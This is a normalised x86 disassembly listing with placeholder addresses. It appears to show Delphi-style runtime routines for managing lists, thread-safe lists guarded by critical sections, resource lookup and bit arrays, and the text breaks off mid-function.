mov eax [ rw-data ]
call sub_417604
xor eax eax
push ebp
push sub_417817
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41781e
mov eax [ rw-data ]
call sub_4176bc
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418314
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418470
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_417140
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418314
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_418470
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_41781e
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_417844
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_417874
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_417604
xor edx edx
push ebp
push sub_4178eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4176bc
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a08
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_418470
mov edx [ ebp - 0x4 ]
call sub_4170e0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417908
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417968
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41796f
lea eax [ ebp - 0xc ]
call sub_403f20
retn
sub_417974
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417604
xor eax eax
push ebp
push sub_4179ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417468
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179c1
mov eax [ rw-data ]
call sub_4176bc
retn
sub_4179c8
push ebx
push esi
mov esi eax
mov eax esi
call sub_417974
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_417908
sub_4179e8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417604
xor eax eax
push ebp
push sub_417a4d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417628
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417610
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417a54
mov eax [ rw-data ]
call sub_4176bc
retn
mov eax ebx
call sub_40311c
mov ebx eax
sub_417a58
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417604
xor eax eax
push ebp
push sub_417a9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4176c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417aa1
mov eax [ rw-data ]
call sub_4176bc
retn
sub_417aa4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417604
xor eax eax
push ebp
push sub_417ae6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_41766c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417aed
mov eax [ rw-data ]
call sub_4176bc
retn
sub_417af0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_417604
xor eax eax
push ebp
push sub_417b37
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_41753c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b3e
mov eax [ rw-data ]
call sub_4176bc
retn
sub_417b44
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_417604
xor eax eax
push ebp
push sub_417b92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_417308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b99
mov eax [ rw-data ]
call sub_4176bc
retn
sub_417bf8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
pop ebp
retn 0x8
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_417c30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_417bf8
mov edx eax
mov eax [ rw-data ]
call sub_4187ac
pop edi
pop esi
pop ebx
retn
sub_417c5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418834
mov esi eax
xor edx edx
push ebp
push sub_417cc6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418898
retn
mov edx ebx
mov eax esi
call sub_418470
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_403a08
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417cd8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418834
mov esi eax
xor edx edx
push ebp
push sub_417d42
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418898
retn
mov edx ebx
mov eax esi
call sub_418470
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a08
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417d54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407e20
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417d94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403f74
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_417dd8
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4184cc
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_418314
sub_417e30
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418470
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_417e70
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_417e30
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_417e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4043e0
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b130
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417f08
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41ac30
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_417f18
push ebx
call sub_405ebc
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405ebc
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_418314
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov ebx eax
call sub_405ebc
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov ebx eax
call sub_405ebc
mov [ eax + 0xc ] ebx
sub_417f70
push ebx
push esi
push edi
call sub_405ebc
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418470
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_417fa0
push ebx
push esi
call sub_405ebc
mov eax [ eax + 0x8 ]
call sub_403190
call sub_405ebc
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418558
mov esi eax
call sub_405ebc
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_418360
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405ebc
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403190
sub_417ffc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_418092
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418099
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_40311c
call sub_417ffc
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404184
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_40516c
call sub_4051bc
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_417e94
or bl al
sub_4180a4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418152
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_418133
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4030d8
call sub_417ffc
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417f18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41813a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417f70
retn
call sub_417fa0
sub_418168
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b2b4
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_4181c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41e438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4181cc
mov eax [ ebp - 0x4 ]
call sub_403190
retn
sub_4181d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax ebx
call sub_4030d8
push eax
mov eax esi
call sub_4030d8
pop edx
cmp edx eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
call sub_4191f8
push eax
mov eax esi
call sub_4191f8
pop edx
cmp edx eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4182e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418168
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4182c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_418168
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_407dac
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182cb
mov eax [ ebp - 0xc ]
call sub_403190
retn
mov al 0x1
sub_4182f4
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_418314
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418360
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4183fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028d8
mov edx esi
mov eax ebx
call sub_418470
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4183c4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4183c0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
jmp sub_40395c
sub_4183fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_418444
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405c50
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4183c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41844b
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_418470
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4183fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_418498
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_41862c
retn
sub_4184cc
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_4184ec
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4183fc
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028d8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_418564
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp esi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4183fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx edi
mov eax ebx
call sub_418470
mov ebp eax
mov eax [ ebx + 0x4 ]
xor edx edx
mov [ eax + edi * 4 ] edx
mov edx edi
mov eax ebx
call sub_418360
xor ecx ecx
mov edx esi
mov eax ebx
call sub_4184ec
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] ebp
sub_4185bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4183fc
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41860c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4184cc
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418360
sub_41862c
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4183fc
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_40271c
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_418668
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_4183fc
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_41862c
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402ba4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_418360
dec ebp
inc edi
jne r-xdata
sub_4186dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403160
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_418730
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40355c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418834
xor eax eax
push ebp
push sub_418792
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403190
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418799
mov eax [ ebp - 0x4 ]
call sub_418898
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_4187ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418834
xor eax eax
push ebp
push sub_418828
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_418314
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4184cc
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41882f
mov eax [ ebp - 0x4 ]
call sub_418898
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_4183fc
sub_418848
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_418834
xor eax eax
push ebp
push sub_41888b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41860c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418892
mov eax [ ebp - 0x4 ]
call sub_418898
retn
sub_4188a4
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4188f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_4188f8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_4188d4
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026dc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402ba4
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026fc
mov edx edi
mov eax ebp
call sub_4188ec
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028d8
sub_41899c
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_4188d4
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_4188f8
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_4189e0
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
